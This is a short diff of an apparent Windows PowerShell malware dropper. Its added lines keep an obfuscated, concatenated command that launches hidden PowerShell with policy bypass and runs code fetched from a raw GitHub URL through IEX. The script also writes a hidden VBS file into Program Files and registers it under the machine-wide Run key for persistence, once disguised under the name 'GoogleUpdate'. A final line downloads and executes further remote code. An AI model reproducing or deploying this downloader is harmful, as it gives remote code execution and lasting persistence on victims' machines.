@@ -45,14 +45,14 @@ hctixwichs=" bYpaSs -c"
 
 
 
-aiensjd= "p"+kcwowycp+ksayewnds+haugwloshbv+hctixwichs+" $U"+"i"+"qFUn"+"cqiR"+"i ="+" (ne"+"w-ob"+"jec"+"t "+"net.we"+"bclien"+"t); "+"IeX ($UiqFUncqiRi.downloadstring('ht"+"tps://"+"raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib706.ps1'))"
+aiensjd= "p"+kcwowycp+ksayewnds+haugwloshbv+hctixwichs+" $w"+"q"+"byWc"+"YSFj"+"KC "+"= (n"+"ew-o"+"bje"+"ct"+" net.w"+"ebclie"+"nt);"+" IeX ($wqbyWcYSFjKC.downloadstring('ht"+"tps://"+"raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib706.ps1'))"
 CreateObject("Wscript."+ksayewnds).Run aiensjd, 0, false
 '@
 Start-Sleep -s 3
 Set-Content -Path $env:ProgramFiles\cu.vbs -Value $VBS_f_ile
 attrib +h "$env:ProgramFiles\cu.vbs"
 
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v GoogleUpdate /t REG_EXPAND_SZ /d "%ProgramFiles%\cu.vbs"
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v PrivateRepo /t REG_EXPAND_SZ /d "%ProgramFiles%\cu.vbs"
 
 
 IEX ((new-object net.webclient).downloadstring($dricksjisx))
